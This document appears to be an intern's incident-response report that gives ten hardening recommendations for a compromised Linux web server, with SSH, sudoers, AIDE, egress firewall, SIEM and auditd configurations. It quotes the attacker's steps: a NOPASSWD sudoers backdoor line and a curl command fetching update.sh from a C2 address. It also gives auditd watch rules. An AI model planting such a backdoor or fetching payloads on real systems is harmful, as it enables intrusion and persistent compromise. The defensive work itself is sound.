# 🛡️ Security Recommendations
### 10 Hardening Measures — Mapped to Root Causes | webserver01 Compromise

> Every recommendation below directly addresses a vulnerability or gap that was exploited
> or contributed to the severity of this incident. Each is mapped to a specific finding.

---

## REC-01 — Disable SSH Password Authentication
**Priority:** CRITICAL | **Maps To:** INC-002

**Root Cause:** The "backup" service account had SSH password authentication enabled,
allowing the brute-force attack to succeed after 8 attempts.

**Fix:**
```bash
# Edit SSH config
sudo vi /etc/ssh/sshd_config

# Set these values:
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM no
PermitRootLogin no
MaxAuthTries 3

# Restart SSH
sudo systemctl restart ssh

# Verify
sudo sshd -T | grep -E "passwordauthentication|permitrootlogin|maxauthtries"
```

**Outcome:** Even if an attacker knows a valid username and password, they cannot
authenticate via SSH without the corresponding private key.

---

## REC-02 — Implement fail2ban with Aggressive Thresholds
**Priority:** HIGH | **Maps To:** INC-001

**Root Cause:** The 40+ brute-force attempts from 198.51.100.23 went unchecked
for over 30 minutes. A properly configured fail2ban would have banned the IP
within the first 2 minutes.

**Fix:**
```bash
# Install
sudo apt install fail2ban -y

# Create custom jail config
sudo vi /etc/fail2ban/jail.local
```

```ini
[DEFAULT]
bantime  = 3600      ; ban for 1 hour
findtime = 60        ; within 60-second window
maxretry = 5         ; ban after 5 failures

[sshd]
enabled  = true
port     = ssh
logpath  = /var/log/auth.log
maxretry = 5
bantime  = 3600
```

```bash
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Monitor bans
sudo fail2ban-client status sshd
```

---

## REC-03 — Apply Principle of Least Privilege to All Accounts
**Priority:** CRITICAL | **Maps To:** INC-003

**Root Cause:** The "backup" service account had sudo privileges, allowing the attacker
to escalate from a low-privilege service account to full root in 45 seconds.

**Fix:**
```bash
# Audit current sudo grants
sudo cat /etc/sudoers
sudo ls /etc/sudoers.d/

# Remove sudo from service accounts
sudo gpasswd -d backup sudo
sudo gpasswd -d www-data sudo

# Verify
groups backup

# Only grant sudo to specific named admin accounts
# NEVER grant it to service accounts (backup, www-data, deploy, etc.)
```

**Outcome:** Even if an attacker compromises a service account, they cannot
escalate to root without a separate privilege escalation exploit.

---

## REC-04 — Harden sudoers — Remove All NOPASSWD Grants
**Priority:** CRITICAL | **Maps To:** INC-004

**Root Cause:** The attacker appended `sysupdate ALL=(ALL) NOPASSWD:ALL` to /etc/sudoers,
granting permanent passwordless root. This would never have been possible if the sudoers
file was properly monitored.

**Fix:**
```bash
# Audit all NOPASSWD entries
sudo grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/

# Remove all NOPASSWD grants
sudo visudo    # carefully remove any NOPASSWD lines

# Enable File Integrity Monitoring on sudoers
sudo apt install aide -y
sudo aide --init

# Add to auditd rules
echo "-w /etc/sudoers -p wa -k sudoers_change" | sudo tee -a /etc/audit/rules.d/audit.rules
sudo systemctl restart auditd
```

---

## REC-05 — Deploy File Integrity Monitor (FIM)
**Priority:** HIGH | **Maps To:** INC-004, INC-005

**Root Cause:** No file integrity monitoring was in place. The attacker modified
/etc/sudoers and the root crontab without triggering any alert.

**Fix — Using Wazuh FIM (recommended) or AIDE:**
```bash
# Install AIDE
sudo apt install aide -y

# Configure monitoring for critical paths
sudo vi /etc/aide/aide.conf

# Add these paths:
# /etc/sudoers PERMS+SHA256
# /etc/cron.d PERMS+SHA256
# /etc/crontab PERMS+SHA256
# /etc/passwd PERMS+SHA256
# /etc/shadow PERMS+SHA256
# /var/www/html PERMS+SHA256

# Initialise database (do this on a known-clean system)
sudo aide --init
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Run daily check (add to cron)
echo "0 6 * * * root /usr/bin/aide --check" | sudo tee /etc/cron.d/aide-check
```

---

## REC-06 — Block Outbound Connections to Unknown IPs (Egress Filtering)
**Priority:** HIGH | **Maps To:** INC-005, INC-006

**Root Cause:** The web server had unrestricted outbound internet access. The C2
connection to 192.0.2.99 and the data exfiltration could both have been blocked
with a simple egress firewall policy.

**Fix:**
```bash
# Default deny outbound, allow only approved services
sudo iptables -P OUTPUT DROP

# Allow established connections
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow only necessary outbound (DNS, OS updates, approved CDN)
sudo iptables -A OUTPUT -p tcp --dport 443 -d [approved-update-server] -j ACCEPT
sudo iptables -A OUTPUT -p udp --dport 53  -j ACCEPT    # DNS
sudo iptables -A OUTPUT -p tcp --dport 80  -d [specific-repos] -j ACCEPT

# Save rules
sudo iptables-save > /etc/iptables/rules.v4
```

**Outcome:** curl http://192.0.2.99/update.sh would have been blocked before
any payload could be downloaded.

---

## REC-07 — Centralised Immutable Logging (Remote SIEM)
**Priority:** HIGH | **Maps To:** INC-007

**Root Cause:** The attacker wiped local bash_history. If logs had been forwarded
in real time to a remote SIEM, this evidence destruction would have been ineffective.

**Fix — rsyslog remote forwarding:**
```bash
# Edit rsyslog config
sudo vi /etc/rsyslog.conf

# Add at the end:
*.* @@[SIEM-SERVER-IP]:514    # TCP forwarding (use @@ for TCP, @ for UDP)

# Restart
sudo systemctl restart rsyslog
```

**Fix — auditd with remote logging:**
```bash
sudo apt install audispd-plugins -y
sudo vi /etc/audisp/audisp-remote.conf
# Set: remote_server = [SIEM-SERVER-IP]

sudo systemctl restart auditd
```

**Outcome:** Even if an attacker deletes local log files, the SIEM already has
a copy that cannot be altered from the compromised host.

---

## REC-08 — Enable auditd with Full EXECVE Logging
**Priority:** HIGH | **Maps To:** INC-007

**Root Cause:** Without EXECVE logging in auditd, the only record of attacker
commands was the bash_history which was subsequently wiped.

**Fix:**
```bash
# Create audit rules file
sudo vi /etc/audit/rules.d/soc-monitoring.rules

# Paste these rules:
-a always,exit -F arch=b64 -S execve -k exec_commands
-a always,exit -F arch=b32 -S execve -k exec_commands
-w /etc/sudoers      -p wa -k sudoers_change
-w /etc/passwd       -p wa -k passwd_change
-w /etc/shadow       -p wa -k shadow_change
-w /etc/crontab      -p wa -k cron_change
-w /etc/cron.d       -p wa -k cron_change
-w /var/spool/cron   -p wa -k cron_change
-w /tmp              -p wxa -k tmp_exec

# Load rules
sudo auditctl -R /etc/audit/rules.d/soc-monitoring.rules
sudo systemctl restart auditd

# Verify
sudo auditctl -l
```

---

## REC-09 — Weekly Automated Account Baseline Audit
**Priority:** MEDIUM | **Maps To:** INC-004, INC-008

**Root Cause:** The backdoor account "sysupdate" (UID=1002) was created and used
for 30 minutes before being discovered during log analysis — not in real time.

**Fix:**
```bash
# Create baseline of approved users
sudo cut -d: -f1,3 /etc/passwd | sort > /root/user_baseline_$(date +%Y%m%d).txt

# Create weekly audit script
sudo vi /usr/local/bin/account-audit.sh
```

```bash
#!/bin/bash
BASELINE="/root/user_baseline_approved.txt"
CURRENT="/tmp/user_current_$(date +%Y%m%d).txt"
cut -d: -f1,3 /etc/passwd | sort > "$CURRENT"

NEW_ACCOUNTS=$(diff "$BASELINE" "$CURRENT" | grep "^>" | awk '{print $2}')
if [ -n "$NEW_ACCOUNTS" ]; then
    echo "ALERT: New accounts detected: $NEW_ACCOUNTS" | \
    mail -s "SECURITY ALERT - New User Account on webserver01" security@yourorg.com
fi
```

```bash
sudo chmod +x /usr/local/bin/account-audit.sh
echo "0 8 * * 1 root /usr/local/bin/account-audit.sh" | sudo tee /etc/cron.d/account-audit
```

---

## REC-10 — Network Segmentation & SSH Jump Host
**Priority:** HIGH | **Maps To:** INC-001, INC-002

**Root Cause:** The web server's SSH port (22) was directly accessible from the
internet, giving the attacker a direct attack surface for brute-forcing.

**Fix:**
```bash
# Option 1: Change SSH port (security through obscurity — minimal but adds friction)
sudo vi /etc/ssh/sshd_config
# Port 2222    (non-standard port)

# Option 2: Restrict SSH access by IP (best practice)
sudo vi /etc/hosts.allow
# sshd: 203.0.113.0/24    (only allow admin IP range)

sudo vi /etc/hosts.deny
# sshd: ALL                (deny all others)

# Option 3: Use a VPN or jump host
# - All SSH access must go through a VPN gateway first
# - Web server firewall only accepts SSH from VPN subnet
# - No direct internet-to-SSH-port access

# Option 4: AWS/Cloud — use Security Groups
# Inbound SSH: Source = [admin-ip]/32 only (not 0.0.0.0/0)
```

---

## Summary Table

| # | Recommendation | Priority | Root Cause Addressed | Effort |
|---|---|---|---|---|
| REC-01 | Disable SSH password auth | CRITICAL | INC-002 — brute-force success | Low |
| REC-02 | Deploy fail2ban | HIGH | INC-001 — 40+ unchecked attempts | Low |
| REC-03 | Least privilege — remove sudo from service accounts | CRITICAL | INC-003 — instant root escalation | Low |
| REC-04 | Harden sudoers + FIM on sudoers file | CRITICAL | INC-004 — NOPASSWD backdoor | Low |
| REC-05 | File Integrity Monitor (AIDE / Wazuh) | HIGH | INC-004, INC-005 — undetected persistence | Medium |
| REC-06 | Egress firewall — block unknown outbound | HIGH | INC-005, INC-006 — C2 + exfil | Medium |
| REC-07 | Remote immutable logging (SIEM) | HIGH | INC-007 — evidence wiped | Medium |
| REC-08 | auditd EXECVE logging | HIGH | INC-007 — commands unlogged | Low |
| REC-09 | Weekly account baseline audit | MEDIUM | INC-004, INC-008 — backdoor undetected | Low |
| REC-10 | Network segmentation + jump host | HIGH | INC-001 — direct internet SSH exposure | High |

---

*Recommendations by: Harmain Shah | Intern ID: CA0200 | Cryptonic Area Internship Program*
